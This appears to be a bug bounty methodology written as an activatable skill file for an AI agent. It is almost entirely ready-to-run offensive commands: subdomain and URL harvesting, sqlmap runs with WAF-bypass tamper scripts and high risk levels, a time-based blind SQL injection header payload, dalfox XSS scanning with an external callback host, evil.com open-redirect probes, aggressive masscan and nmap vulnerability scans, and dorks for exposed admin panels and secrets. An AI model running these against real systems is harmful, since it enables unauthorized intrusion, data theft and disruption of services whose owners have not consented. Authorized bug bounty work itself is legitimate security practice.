# wadgamer10 Bug Hunting Methodology

Complete bug bounty methodology by wadgamer10. Activate for subdomain enumeration, URL collection, JS hunting, XSS, SQLi, SSTI, CORS, open redirect, port scanning, nuclei scanning, and general bug bounty workflow.

## Recon

### Passive Subdomain Enumeration
```bash
subfinder -dL domains.txt -o subfinder.txt
amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt
echo test.com | assetfinder --subs-only >> asset.txt
python github-subdomains.py -t <token> -d test.com | grep -v '@' | sort -u | grep ".test.com" >> github-subs.txt
curl -s https://crt.sh/?q=%25.test.com | grep test.com | grep TD | sed -e 's/<//g' -e 's/>//g' -e 's/TD//g' -e 's/\///g' -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt
sublist3r -d safesavings.com -o sublist3r.txt
```

Merge:
```bash
cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt
cat all-subs.txt | httpx -o live-subs.txt
cat live-subs.txt | dirsearch --stdin
```

### Active Subdomain Bruteforce
```bash
ffuf -u "https://FUZZ.kaggle.com" -w best-dns-wordlist.txt -mc 200,403,404,302,301
gobuster dns -d test.com -t 50 -w 2m-subdomains.txt -q -o g.txt
puredns bruteforce Subdomain.txt test.com resolvers.txt
```

Wordlists: https://wordlists.assetnote.io/

### Full Recon Script
```bash
for url in $(cat domains.txt); do
  subfinder -d $url -all >> subfinder.txt
  amass enum -passive -norecursive -noalts -d $url >> amass.txt
  echo $url | assetfinder --subs-only >> asset.txt
  python github-subdomains.py -t <token> -d $url | grep -v '@' | sort -u | grep ".$url" >> github-subs.txt
  curl -s https://crt.sh/?q=%25.$url | grep $url | grep TD | sed -e 's/<//g' -e 's/>//g' -e 's/TD//g' -e 's/\///g' -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt
done
cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt
rm subfinder.txt amass.txt asset.txt crt.txt
cat all-subs.txt | httpx -o live-subs.txt
```

## Subdomain Takeover
```bash
nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt
subzy run --targets live-subs.txt
```

## URL & Parameter Collection
```bash
# waymore
waymore -i example.com -mode U -oU result.txt
cat result.txt | sort -u > sorted.txt
cat sorted.txt | httpx -mc 200 -o live-urls.txt
cat live-urls.txt | grep "=" > live-parameters.txt
```

### URL Collection Script
```bash
for d in $(cat target.txt); do
  waybackurls $d >> wayback.txt
  echo $d | gau >> gau.txt
  paramspider -d $d
  python github-endpoints.py -t <token> -d $d >> github-urls.txt
done
cat wayback.txt gau.txt results/*.txt github-urls.txt > f.txt
cat f.txt | grep "=" > urls.txt
cat urls.txt | httpx -silent -o p.txt
cat p.txt | uro > params.txt
cat f.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt
```

## Virtual Host Scanner
```bash
git clone https://github.com/jobertabma/virtual-host-discovery.git
ruby scan.rb --ip=151.101.194.133 --host=cisco.com
```

## JS Hunting

### Collect JS files
```bash
katana -u https://www.example.com | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt
echo example.com | gau | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a
cat waymore.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a
```

### Scan JS files
```bash
cat js-files.txt | jscracker | tee jscracker-result.txt
nuclei -l js-files.txt -t /root/nuclei-templates/http/exposures/ | tee nuclei-result.txt
python3 JSScanner.py
python3 main.py -u https://example.com | tee pinkerton-result.txt
```

## Shodan Dorking
```
ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
Set-Cookie:"mongo-express=" "200 OK"
ssl:"invisionapp.com" http.title:"index of / "
ssl:"arubanetworks.com" 200 http.title:"dashboard"
net:192.168.43/24, 192.168.40/24
```

## Google Dorking
```
site:*.gapinc.com inurl:"*admin | login" | inurl:.php | .asp
intext:"index of /.git"
inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
inurl:/geoserver/ows?service=wfs
```

## GitHub Dorking
```bash
python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s
python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo.com" -s
```

## Manual Testing Checklist
- CSRF
- IDOR
- Business Logic Vulnerabilities
- API bugs
- SQLi
- XSS

## XSS Testing
```bash
python3 paramspider.py --domain indrive.com
cat params.txt | kxss
cat params.txt | Gxss -c 100 -p Xss | sort -u | dalfox pipe
echo "target.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
dalfox url <url> -b https://hahwul.xss.ht
dalfox file urls.txt -b https://hahwul.xss.ht
```

## SQL Injection
```bash
sqlmap -m s.txt --level 1 --random-agent --batch --dbs
sqlmap -m s.txt --level 1 --random-agent --batch --tamper="space2comment" --dbs
sqlmap -u https://target.com/index.php --dbs --forms --crawl=2
sqlmap -u <url> --data "search=hello&value=submit"
sqlmap -r request.txt -p login --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs
```

### One-liner
```bash
cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
```

### WAF Bypass
```
--tamper="between,randomcase,space2comment"
--technique U --tamper="space2mysqlblank.py"
-v3 --technique U --tamper="space2comment"
```

## SSTI
```bash
./tplmap.py -u "domain.com/?parameter=SSTI*"
httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
```

## Blind SQLi
`X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`

## CORS Misconfiguration
```bash
corscanner -i live_subdomains.txt -v -t 100
cat CORS-domain.txt | CORS-Scanner
```

## Port Scanning
```bash
masscan -p0-79,81-442,444-65535 -iL live-ips.txt --rate=10000 -oB temp
naabu -rate 10000 -l live-hosts.txt -silent
nmap -Pn -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt --script=vuln
```

## Nuclei
```bash
nuclei -u https://example.com
nuclei -list urls.txt -t /fuzzing-templates
nuclei -list live-subs.txt -t /vulnerabilities -t /cves -t /exposures -t /sqli.yaml
```

## Open Redirect
```bash
waybackurls target.nl | grep -a -i =http | qsreplace 'evil.com' | while read host; do curl -s -L $host -I | grep "evil.com" && echo "$host Vulnerable"; done
httpx -l i.txt -path "///evil.com" -status-code -mc 302
```

## Key Tools
- dnsx, httpx, nuclei, subfinder, assetfinder, amass
- paramspider, waybackurls, gau, katana, waymore
- sqlmap, dalfox, Gxss, kxss, jscracker
- masscan, naabu, nmap
- dirsearch, ffuf, gobuster
- corscanner, gitGraber, tplmap
- subzy, JSScanner, Pinkerton, arjun
- gitrob, git-secrets, bucket_finder, retire-js
- jwt_tool, ssrfDetector, LFISuit, GitTools
- wpscan, CMSMap, Sn1per, hydra
